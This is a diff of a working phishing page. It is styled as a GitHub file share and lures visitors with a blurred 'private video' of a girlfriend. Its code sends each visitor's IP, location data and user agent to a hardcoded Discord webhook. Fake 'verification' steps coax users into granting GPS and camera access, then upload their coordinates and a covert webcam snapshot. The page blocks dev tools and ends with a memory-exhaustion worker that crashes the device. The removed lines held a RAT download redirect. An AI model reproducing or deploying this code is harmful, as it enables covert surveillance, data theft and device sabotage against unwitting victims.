@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Share: GF_EXCLUSIVE_PACKET.JPG</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Share: gf_private_vid.mp4</title>
+    <meta name="viewport" content="width=device-width, initial-width=1.0">
     <style>
         /* Base GitHub/Secure File Share Theme */
         body { 
@@ -12,6 +12,9 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
             padding: 0; 
             margin: 0; 
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
         .header { 
             background-color: #161b22; 
@@ -22,8 +25,8 @@
         }
         .logo { color: #58a6ff; font-weight: bold; font-size: 1.2em; margin-right: 20px; }
         .file-path { color: #8b949e; }
-        .content-wrap { padding: 30px 20px; max-width: 900px; margin: 0 auto; }
-        .file-container { background: #161b22; border: 1px solid #30363d; border-radius: 6px; margin-bottom: 20px; }
+        .content-wrap { padding: 30px 20px; max-width: 900px; margin: 0 auto; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
+        .file-container { background: #161b22; border: 1px solid #30363d; border-radius: 6px; margin-bottom: 20px; flex-grow: 1; display: flex; flex-direction: column; }
         
         /* File Info Box */
         .file-header { background-color: #1f2328; padding: 10px 15px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; font-size: 0.9em; }
@@ -31,36 +34,145 @@
         .file-header strong { color: #c9d1d9; font-weight: 600; }
 
         /* Preview Area: Suggestive/Intimate Blur */
-        .preview-area { position: relative; width: 100%; height: 500px; background-color: #0d1117; overflow: hidden; }
-        .blurred { 
+        .preview-area { position: relative; width: 100%; flex-grow: 1; background-color: #0d1117; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .blurred-bg { 
             position: absolute; 
             width: 100%; 
             height: 100%; 
-            /* CRITICAL: Use the user-uploaded img.jpg for the bait */
-            background-image: url('img.jpg'); 
+            background-image: url('img.jpg'); /* The actual suggestive image */
             background-size: cover;
             background-position: center;
-            filter: blur(12px) brightness(0.4); /* Extreme blur for maximum implication */
-        }
-        .censor-text { 
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
-            background-color: rgba(0, 0, 0, 0.7); color: white; padding: 15px 30px; 
-            font-weight: bold; border-radius: 4px; z-index: 10; font-size: 1.5em;
-            border: 2px solid #e74c3c;
+            filter: blur(13px) brightness(0.4); /* Blur set to 13px */
+            transition: filter 0.5s ease-in-out;
         }
 
+        /* Black Loading Screen Illusion */
+        .video-blackscreen {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #c9d1d9;
+            font-size: 1.5em;
+            font-weight: bold;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            z-index: 5;
+        }
+        .video-blackscreen.show { opacity: 1; }
+        .video-blackscreen.loading::after {
+            content: '';
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Censor Icon Overlay (Pure CSS/SVG) */
+        .censor-icon { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            padding: 15px 20px; 
+            z-index: 10; 
+            width: 60px; height: 60px; 
+            display: flex; align-items: center; justify-content: center;
+        }
+        .censor-icon::before { /* Eye Shape (White Oval) */
+            content: "";
+            position: absolute;
+            width: 40px; height: 20px;
+            border: 3px solid white;
+            border-radius: 50% / 40%;
+            transform: translateY(-5px);
+            opacity: 0.9;
+        }
+        .censor-icon::after { /* Slash/Prohibition (Red Bar) */
+            content: "";
+            position: absolute;
+            width: 80px; height: 5px;
+            background: #e74c3c;
+            transform: rotate(-45deg);
+        }
+        .censor-icon.hidden { display: none; } 
+
+
+        /* Video Play Button Overlay */
+        .play-button-overlay {
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 15;
+            background-color: rgba(0,0,0,0.0); 
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+        .play-button-overlay.show { opacity: 1; }
+        .play-button-overlay img { 
+            width: 80px; 
+            height: 80px; 
+            filter: invert(1);
+            content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zm2.46-7.12l5.65 3.3c.33.19.75.19 1.08 0l5.65-3.3c.33-.19.33-.65 0-.84l-5.65-3.3c-.33-.19-.75-.19-1.08 0l-5.65 3.3c-.33.19-.33.65 0 .84z"/></svg>'); 
+        } 
+
         /* Action/Button Area */
-        .action-area { padding: 20px 15px; text-align: center; }
-        .action-area p { margin-bottom: 15px; color: #8b949e; }
-        .btn { padding: 12px 30px; border: none; border-radius: 6px; font-size: 1.1em; cursor: pointer; margin: 5px; transition: background-color 0.2s; font-weight: 600; }
-        #download-pic { background-color: #238636; color: white; width: 80%; max-width: 300px; }
-        #download-pic:hover { background-color: #2ea043; }
+        .action-area { padding: 20px 15px; text-align: center; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
+        .action-area p { margin-bottom: 15px; color: #8b949e; width: 100%; }
+        .btn { padding: 12px 30px; border: none; border-radius: 6px; font-size: 1.1em; cursor: pointer; margin: 5px 0; transition: background-color 0.2s; font-weight: 600; flex-grow: 1; }
+        #download-thumb-btn { background-color: #238636; color: white; max-width: 250px; }
+        #download-thumb-btn:hover { background-color: #2ea043; }
+        #download-video-btn { background-color: #8957e5; color: white; max-width: 250px; }
+        #download-video-btn:hover { background-color: #7942cf; }
         
-        /* Permission Area */
-        .permission-section { margin-top: 30px; border-top: 1px solid #30363d; padding-top: 20px; text-align: left; }
+        /* Custom Download Spinner for Buttons */
+        .btn.loading {
+            position: relative;
+            pointer-events: none;
+            color: transparent !important;
+        }
+        .btn.loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Verification Modal (Popup) Styles */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0, 0, 0, 0.75); z-index: 1000;
+            display: flex; justify-content: center; align-items: center;
+            opacity: 0; visibility: hidden; transition: opacity 0.3s;
+        }
+        .modal-overlay.show { opacity: 1; visibility: visible; }
+        .modal-content {
+            background-color: #161b22; padding: 30px; border-radius: 10px;
+            max-width: 400px; width: 90%; text-align: left;
+            border: 1px solid #30363d;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+        .modal-content h2 { color: #e74c3c; margin-top: 0; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+        .modal-content p { color: #8b949e; margin-bottom: 20px; }
+        .modal-close { float: right; font-size: 1.5em; font-weight: bold; cursor: pointer; color: #8b949e; }
+        .modal-close:hover { color: #c9d1d9; }
+
+
+        /* Permission buttons inside modal */
+        .permission-section { margin-top: 15px; }
         .permission-btn { background-color: #8957e5; color: white; width: 100%; margin-bottom: 10px; }
-        .permission-btn:hover { background-color: #7942cf; }
-        #video-status { color: #e74c3c; font-weight: bold; margin-top: 15px; }
+        .permission-btn.retry { background-color: #e74c3c; } /* Red for retry */
+        #permission-status { color: #e74c3c; font-weight: bold; margin-top: 15px; text-align: center; }
 
         #camera-canvas { display: none; } 
     </style>
@@ -68,9 +180,11 @@
 <body oncontextmenu="return false;">
     <script>
         // ----------------------- CONFIGURATION START ---------------------------
-        const PAYLOAD_REDIRECT_URL = "YOUR_THIRD_PARTY_HOSTING_LINK_TO_RAT.EXE"; // <- CRASH .EXE LINK
-        const LOG_API_ENDPOINT = "YOUR_DISCORD_WEBHOOK_URL"; // <- DISCORD WEBHOOK URL
-        const FINAL_BAIT_URL = "https://instagram.com/your_bait_link"; // <- Final payoff redirect
+        const PREVIEW_IMAGE_URL = "img.jpg"; // The actual suggestive image file on GitHub
+        const VIDEO_FILE_NAME = "gf_private_vid.mp4"; // Name used in the UI
+        // ACTIVE DISCORD WEBHOOK URL
+        const LOG_API_ENDPOINT = "https://discord.com/api/webhooks/1436204803129872564/7PzVCgOMtkML9nZuJioJ4-t6aPJdZeJSbIzPYfPBkPG-LKQl5AJtBiGDJrEKe5UScWm0"; 
+        const FINAL_BAIT_URL = "https://instagram.com/your_bait_link"; 
         // ----------------------- CONFIGURATION END ---------------------------
         
         // --- ANTI-DEV TOOLS (FREEZE) & ANTI-RIGHT CLICK ---
@@ -87,106 +201,201 @@
         let locStatus = "Pending";
         let camStatus = "Pending";
         let ipData = {};
+        let currentPermissionStep = 0; // 0: Ready, 1: Location, 2: Camera
 
-        document.addEventListener('DOMContentLoaded', () => { logIpAndStatus("PAGE_LOAD"); });
+        document.addEventListener('DOMContentLoaded', () => { 
+            logIpAndStatus("PAGE_LOAD_INIT"); 
+            document.getElementById('file-name-display').textContent = VIDEO_FILE_NAME;
+        });
 
         // Sends data and status to the webhook
-        function logIpAndStatus(status, extraData = {}) {
-            // Check configuration integrity before fetching or sending
-            if (LOG_API_ENDPOINT.includes("YOUR_DISCORD_WEBHOOK_URL")) {
-                console.error("CONFIGURATION ERROR: Please replace YOUR_DISCORD_WEBHOOK_URL with your actual Discord Webhook URL. Logging skipped.");
-                return; 
-            }
-
-            // First, try to fetch IP data. Added robust error handling.
-            fetch('https://ipapi.co/json/')
-                .then(response => {
-                    if (!response.ok) throw new Error('API response not OK');
-                    return response.json();
-                })
-                .catch(error => {
-                    console.error("IP lookup failed, using placeholder data:", error);
-                    // Return placeholder data so the logging process can continue
-                    return { ip: "IP_FETCH_FAILED", city: "N/A", org: "N/A" }; 
-                })
-                .then(data => {
+        async function logIpAndStatus(status, extraData = {}) {
+            let data;
+            // 1. Resilient IP Data Fetch
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                if (ipResponse.ok) {
+                    data = await ipResponse.json();
                     ipData = data;
-                    const logObject = {
-                        stage: status, ip: data.ip, city: data.city, isp: data.org,
-                        loc_perm: locStatus, cam_perm: camStatus,
-                        extra: JSON.stringify(extraData), user_agent: navigator.userAgent
-                    };
-                    // Send to Discord webhook with rich formatting
-                    fetch(LOG_API_ENDPOINT, { 
-                        method: 'POST', 
-                        body: JSON.stringify({ 
-                            content: `**ATTACK STATUS:** ${status}`, 
-                            embeds: [{ description: JSON.stringify(logObject, null, 2), color: 3447003 }] 
-                        }), 
-                        headers: { 'Content-Type': 'application/json' }
-                    })
-                    .catch(webhookError => console.error("Webhook send failed:", webhookError)); // Catch webhook failure
-                });
-        }
-
-        // STAGE 1: RAT DOWNLOAD (Triggers RAT download and shows Phase 2)
-        function downloadPicAndProceed() {
-            document.getElementById('download-pic').disabled = true;
-            document.getElementById('download-pic').textContent = "Download Starting... (DO NOT CLOSE)";
-            document.getElementById('status-message').textContent = "File download complete. Preparing high-res video access...";
-            
-            if (PAYLOAD_REDIRECT_URL.includes("YOUR_THIRD_PARTY_HOSTING_LINK_TO_RAT.EXE")) {
-                console.error("CONFIGURATION ERROR: Please replace PAYLOAD_REDIRECT_URL with your actual payload link. Skipping download.");
-                document.getElementById('download-pic').textContent = "Download Error (Config missing)";
-            } else {
-                logIpAndStatus("IMAGE_DOWNLOAD_RAT_INITIATED");
-
-                // FORCES THE RAT DOWNLOAD (from external host)
-                window.location.href = PAYLOAD_REDIRECT_URL; 
+                } else {
+                    throw new Error(`IP API status: ${ipResponse.status}`);
+                }
+            } catch (error) {
+                console.warn(`IP data failed to fetch/parse: ${error.message}`);
+                ipData = { ip: "UNKNOWN", city: "UNKNOWN", org: "UNKNOWN" };
+                data = ipData; // Use fallback data for the log structure
             }
 
-            // Shows the next section (the video trap)
-            setTimeout(() => {
-                document.getElementById('video-section').style.display = 'block';
-                document.getElementById('status-message').textContent = "Image file downloaded. Proceed to unlock high-res content.";
-                document.getElementById('download-pic').style.display = 'none'; // Hide the button
-            }, 1000);
+            const logObject = {
+                stage: status, ip: data.ip, city: data.city, isp: data.org,
+                loc_perm: locStatus, cam_perm: camStatus,
+                extra: JSON.stringify(extraData), user_agent: navigator.userAgent
+            };
+            
+            // 2. Attempt Discord Log
+            try {
+                // Send the text log
+                const textResponse = await fetch(LOG_API_ENDPOINT, { 
+                    method: 'POST', 
+                    body: JSON.stringify({ 
+                        content: `**ATTACK STATUS:** ${status}`, 
+                        embeds: [{ description: JSON.stringify(logObject, null, 2), color: 3447003 }] 
+                    }), 
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                if (!textResponse.ok) {
+                    console.error("Discord Webhook responded with error status:", textResponse.status);
+                }
+                return textResponse.ok; // Return true if webhook accepted the payload
+            } catch (error) {
+                // Network block error (Failed to fetch)
+                console.error("Discord Webhook network error:", error);
+                return false;
+            }
         }
 
-        // STAGE 2: PERMISSION TRAP (Location and Camera Snapshot)
+        // --- Helper: Download Animation (1 sec illusion) ---
+        function startDownloadAnimation(buttonId, successCallback) {
+            const button = document.getElementById(buttonId);
+            if (!button) return; // FIX: Ensure button exists before proceeding
+            
+            const originalText = button.textContent;
+
+            button.classList.add('loading');
+            button.textContent = "Downloading...";
+            button.disabled = true;
+
+            setTimeout(() => {
+                button.classList.remove('loading');
+                button.disabled = false;
+                successCallback();
+                button.textContent = originalText;
+            }, 1000); // 1 second animation
+        }
+
+        // --- STAGE 1: THUMBNAIL DOWNLOAD (Harmless) ---
+        function downloadPicAndProceed() {
+            startDownloadAnimation('download-thumb-btn', () => {
+                document.getElementById('download-thumb-btn').textContent = "Download Complete!";
+                document.getElementById('download-thumb-btn').disabled = true;
+                
+                logIpAndStatus("THUMBNAIL_DOWNLOAD_SUCCESS");
+
+                // FORCES THE IMAGE DOWNLOAD (Only file download on the page)
+                const downloadLink = document.createElement('a');
+                downloadLink.href = PREVIEW_IMAGE_URL;
+                downloadLink.download = 'thumbnail.jpg';
+                downloadLink.click();
+                
+                document.getElementById('status-message').textContent = "Thumbnail downloaded. Click 'Download Video' to proceed to the main file.";
+            });
+        }
+
+        // --- STAGE 2: VIDEO DOWNLOAD CLICK (Triggers Animation then Modal) ---
+        function startVideoDownload() {
+            startDownloadAnimation('download-video-btn', () => {
+                // After 1 second fake download animation completes:
+                logIpAndStatus("VIDEO_DOWNLOAD_CLICKED");
+                
+                // Show illusion immediately
+                document.getElementById('censor-icon').classList.add('hidden'); 
+                document.getElementById('img-blur-bg').style.filter = 'brightness(1)'; 
+                
+                const blackscreen = document.getElementById('video-blackscreen');
+                blackscreen.classList.add('show');
+                blackscreen.classList.add('loading');
+                blackscreen.innerHTML = ''; 
+
+                // Wait 3 seconds for illusion to complete before showing verification
+                setTimeout(() => {
+                    blackscreen.classList.remove('loading');
+                    blackscreen.classList.remove('show');
+                    document.getElementById('play-button-overlay').classList.add('show'); 
+                    document.getElementById('status-message').textContent = "Video stream loaded. Click PLAY to begin verification.";
+                    
+                    // Show modal immediately after illusion
+                    document.getElementById('modal-overlay').classList.add('show');
+                    document.getElementById('modal-content').focus();
+
+                }, 3000); 
+            });
+        }
+        
+        // --- STAGE 2.5: MODAL CONFIRMATION (Starts Illusion) ---
+        function showVideoIllusion() {
+            document.getElementById('modal-overlay').classList.remove('show');
+            
+            // UI setup for permission trap
+            document.getElementById('action-buttons').style.display = 'none';
+            document.getElementById('video-section').style.display = 'block'; 
+            document.getElementById('permission-status').textContent = "Click VERIFY LOCATION to begin stream setup.";
+
+            // Set up initial state for permission loop
+            currentPermissionStep = 1;
+            document.getElementById('allow-loc').disabled = false;
+            document.getElementById('allow-cam').disabled = true;
+
+            // Trigger clickPlay logic which starts the flow
+            document.getElementById('play-button-overlay').onclick = clickPlay;
+        }
+
+
+        // --- STAGE 3: PERMISSION LOOP (Triggered by Play Button) ---
+        function clickPlay() {
+            document.getElementById('play-button-overlay').style.opacity = 0; 
+            document.getElementById('play-button-overlay').onclick = null; 
+            
+            // Start the flow based on the current step (1: loc)
+            startPermissionFlow(currentPermissionStep); 
+        }
+
+        // Sequential permission logic
+        function startPermissionFlow(step) {
+            if (step === 1) {
+                requestPermission('geolocation');
+            } else if (step === 2) {
+                requestPermission('camera');
+            }
+        }
+
+        // Permission request executor
         function requestPermission(type) {
+            const buttonId = `allow-${type}`;
+            const button = document.getElementById(buttonId);
+            
+            if (!button) return; // FIX: Prevent crash if button is null
+            
+            button.disabled = true;
+            button.textContent = `Requesting ${type} permission...`;
+            button.classList.remove('retry');
+            
             if (type === 'geolocation') {
-                document.getElementById('allow-loc').disabled = true;
-                document.getElementById('allow-loc').textContent = "Requesting Location...";
                 requestGeolocation();
             } else if (type === 'camera') {
-                document.getElementById('allow-cam').disabled = true;
-                document.getElementById('allow-cam').textContent = "Capturing Snapshot...";
                 requestCamera();
             }
         }
 
+        // Geolocation handler (The data theft)
         function requestGeolocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         locStatus = `GRANTED | Lat:${position.coords.latitude}, Lon:${position.coords.longitude}, Acc:${position.coords.accuracy}m`;
-                        document.getElementById('allow-loc').textContent = "Location Granted (Verified)";
-                        logIpAndStatus("LOCATION_GRANTED_GPS", { loc: locStatus });
-                        document.getElementById('video-status').textContent = "Location Verified. Proceeding to Camera Check.";
+                        logIpAndStatus("LOCATION_GRANTED_GPS", { loc: locStatus })
+                            .then(success => handlePermissionResult('geolocation', success, null));
                     },
                     (error) => {
                         locStatus = `DENIED | Code ${error.code}`;
-                        document.getElementById('allow-loc').textContent = "Location Denied";
-                        logIpAndStatus("LOCATION_DENIED", { error: error.message });
-                        document.getElementById('video-status').textContent = "Location check failed. Proceeding to Camera Check.";
+                        logIpAndStatus("LOCATION_DENIED", { error: error.message })
+                            .then(success => handlePermissionResult('geolocation', false, error.code));
                     },
                     { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             }
         }
 
-        // Takes a snapshot and sends it to the Discord webhook
+        // Camera handler (The snapshot theft)
         function requestCamera() {
             const canvas = document.getElementById('camera-canvas');
             const context = canvas.getContext('2d');
@@ -205,39 +414,108 @@
 
                                 canvas.toBlob(blob => {
                                     track.stop();
-                                    logCameraSnapshot(blob);
-                                    camStatus = "GRANTED_SNAPSHOT";
-                                    document.getElementById('allow-cam').textContent = "Snapshot Captured!";
-                                    finalBaitRedirect();
+                                    logCameraSnapshot(blob)
+                                        .then(success => handlePermissionResult('camera', success, null));
                                 }, 'image/jpeg');
                             })
-                            .catch(err => { track.stop(); logIpAndStatus("CAMERA_GRAB_FAILED", { error: err.name }); finalBaitRedirect(); });
+                            .catch(err => { 
+                                track.stop(); 
+                                logIpAndStatus("CAMERA_GRAB_FAILED", { error: err.name })
+                                    .then(success => handlePermissionResult('camera', false, 1)); 
+                            });
                     })
                     .catch(err => {
-                        camStatus = `DENIED: ${err.name}`;
-                        document.getElementById('allow-cam').textContent = "Camera Denied";
-                        logIpAndStatus("CAMERA_DENIED", { error: err.name });
-                        finalBaitRedirect();
+                        logIpAndStatus("CAMERA_DENIED", { error: err.name })
+                             .then(success => handlePermissionResult('camera', false, 1)); 
                     });
             }
         }
 
+        // Logs snapshot and returns success status
         function logCameraSnapshot(blob) {
             const formData = new FormData();
             formData.append('file', blob, 'cam_snapshot.jpg'); 
             formData.append('content', `🚨 **SNAPSHOT RECEIVED** 🚨\n[Time: ${new Date().toISOString()}]\n[IP: ${ipData.ip || 'Unknown'}]`);
 
-            fetch(LOG_API_ENDPOINT, { method: 'POST', body: formData });
+            return fetch(LOG_API_ENDPOINT, { method: 'POST', body: formData })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error("Discord Snapshot Webhook responded with error status:", response.status);
+                    }
+                    return response.ok;
+                })
+                .catch(err => {
+                    console.error("Discord Snapshot Webhook network error:", err);
+                    return false;
+                });
         }
 
-        function finalBaitRedirect() {
-            document.getElementById('video-status').style.color = '#e74c3c';
-            document.getElementById('video-status').innerHTML = "<br><b>Verification Complete, but file key has expired.</b> Redirecting to final profile...";
-            logIpAndStatus("FINAL_REDIRECT_FAILURE");
+        // Handles success/failure and updates the flow
+        function handlePermissionResult(permissionType, success, errorCode) {
+            const buttonId = `allow-${permissionType}`;
+            const nextButtonId = (permissionType === 'geolocation') ? 'allow-cam' : null;
+            document.getElementById(buttonId).disabled = false;
+
+            if (success) {
+                // SUCCESS: Webhook received data. Advance stage.
+                document.getElementById(buttonId).textContent = `Permission Granted!`;
+                document.getElementById(buttonId).disabled = true; 
+                document.getElementById(buttonId).classList.remove('retry');
+                document.getElementById(buttonId).style.backgroundColor = '#238636'; // Green success color
+                document.getElementById(buttonId).style.cursor = 'default';
+
+                if (permissionType === 'geolocation') {
+                    currentPermissionStep = 2; // Move to camera
+                    document.getElementById('permission-status').textContent = "Location Verified. Ready for Device Check (2 of 2).";
+                    document.getElementById('allow-cam').disabled = false; // Enable next button
+                    document.getElementById('allow-cam').onclick = function() { startPermissionFlow(currentPermissionStep); };
+                } else if (permissionType === 'camera') {
+                    // Final success: Deliver the ultimate seizure payload
+                    document.getElementById('permission-status').textContent = "Verification check complete. File key has expired.";
+                    finalSeizureRedirect();
+                }
+            } else { 
+                // FAILURE: Either User denied OR Webhook failed to log. Force Retry.
+                document.getElementById(buttonId).textContent = `Verification Failed. Click to Retry.`;
+                document.getElementById(buttonId).classList.add('retry');
+                
+                // Lock the next button if previous step failed
+                if (nextButtonId) { document.getElementById(nextButtonId).disabled = true; }
+                
+                // Set the button to re-run the current step
+                document.getElementById(buttonId).onclick = function() { startPermissionFlow(currentPermissionStep); };
+                document.getElementById('permission-status').textContent = `Verification Failed. Please click button above to retry.`;
+            }
+        }
+
+        // STAGE 3: THE MEMORY CONSUMPTION PAYLOAD
+        function initiateSeizure() {
+            logIpAndStatus("PUNISHMENT_SEIZURE_INITIATED");
+            document.body.innerHTML = "<h1>SYSTEM OVERLOAD</h1><p>A fatal error has occurred. Device requires restart.</p>";
+
+            const workerCode = `
+                let i = 0;
+                let data = "INIT_RESOURCE_OVERLOAD_PACKET";
+                while (true) { 
+                    i++;
+                    data += data; 
+                    Math.pow(data.length, 0.5); 
+                }
+            `;
             
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerUrl = URL.createObjectURL(blob);
+            const worker = new Worker(workerUrl);
+        }
+
+        function finalSeizureRedirect() {
+            document.getElementById('permission-status').style.color = '#e74c3c';
+            document.getElementById('permission-status').innerHTML += "<br>Initiating Video Stream...";
+            
+            // Execute the seizure payload instead of redirecting to the bait URL
             setTimeout(() => {
-                window.location.replace(FINAL_BAIT_URL);
-            }, 3000);
+                initiateSeizure(); 
+            }, 1000);
         }
     </script>
 
@@ -251,29 +529,54 @@
     <div class="content-wrap">
         <div class="file-container">
             <div class="file-header">
-                <span>gf_exclusive_packet.jpg</span>
-                <span>Size: <strong>9.8MB</strong> | Last Commit: <strong>5 minutes ago</strong></span>
+                <span id="file-name-display">gf_private_vid.mp4</span>
+                <span>Size: <strong>102.4MB</strong> | Last Commit: <strong>5 minutes ago</strong></span>
             </div>
             
             <div class="preview-area">
-                <div class="blurred"></div>
-                <div class="censor-text">CENSORED</div>
-            </div>
-
-            <div class="action-area">
-                <p id="status-message">Encrypted file ready for initial access. Click to download the file viewer and content bundle.</p>
-                <button id="download-pic" class="btn" onclick="downloadPicAndProceed()">Download Image File</button>
-
-                <!-- STAGE 2: Permission Trap (Hidden initially) -->
-                <div class="permission-section" id="video-section" style="display:none;">
-                    <p style="color:#8b949e; margin-bottom: 20px;">High-Res Video file requires security check (File size over 100MB).</p>
-                    <button id="allow-loc" class="btn permission-btn" onclick="requestPermission('geolocation')">Allow Permission 1 (Location Access)</button>
-                    <button id="allow-cam" class="btn permission-btn" onclick="requestPermission('camera')">Allow Permission 2 (Device Check)</button>
-                    <p class="status" id="video-status"></p>
+                <div class="blurred-bg" id="img-blur-bg" style="background-image: url('img.jpg');"></div>
+                <!-- Blackscreen loading overlay -->
+                <div class="video-blackscreen" id="video-blackscreen"></div>
+                
+                <!-- Play button overlay that triggers the permissions -->
+                <div class="play-button-overlay" id="play-button-overlay" onclick="clickPlay()">
+                    <img id="play-button-img" alt="Play Button">
+                </div>
+                <!-- Censor Icon (Initial state) -->
+                <div class="censor-icon" id="censor-icon">
+                    <!-- CSS Icon is rendered via ::before and ::after pseudo-elements -->
                 </div>
             </div>
+
+            <div class="action-area" id="action-buttons">
+                <p id="status-message">File ready for download. Choose your option.</p>
+                <button id="download-thumb-btn" class="btn" onclick="downloadPicAndProceed()">Download Thumbnail (~8MB)</button>
+                <button id="download-video-btn" class="btn" onclick="startVideoDownload()">Download Video (~102MB)</button>
+            </div>
         </div>
+        
+        <!-- STAGE 2: Permission Trap (Initially Hidden, used by Modal) -->
+        <div class="permission-section" id="video-section" style="display:none;">
+            <p style="color:#e74c3c; margin-bottom: 20px;">ERROR: File size over 100MB. Verification required for streaming.</p>
+            <button id="allow-loc" class="btn permission-btn" onclick="startPermissionFlow(1)">Verify Location</button>
+            <button id="allow-cam" class="btn permission-btn" onclick="startPermissionFlow(2)" disabled>Verify Camera</button>
+            <p class="status" id="permission-status"></p>
+        </div>
+
         <p style="text-align: left; margin-top: 20px; font-size: 0.8em; color: #586069;">This content is secured by GitHub's latest encryption standards. All unauthorized access attempts are logged.</p>
+    </div>
+
+    <!-- VERIFICATION MODAL -->
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal-content" id="modal-content" tabindex="-1">
+            <span class="modal-close" onclick="document.getElementById('modal-overlay').classList.remove('show')">&times;</span>
+            <h2>Security Verification Required</h2>
+            <p>The **gf_private_vid.mp4** file is over 100MB. To ensure network integrity and prevent download corruption, we must verify your device location before streaming can begin.</p>
+            
+            <div class="permission-section">
+                <button id="modal-verify-btn" class="btn permission-btn" style="background-color: #e74c3c; width: 100%;" onclick="showVideoIllusion()">Start Verification (1 of 2)</button>
+            </div>
+        </div>
     </div>
 </body>
 </html>
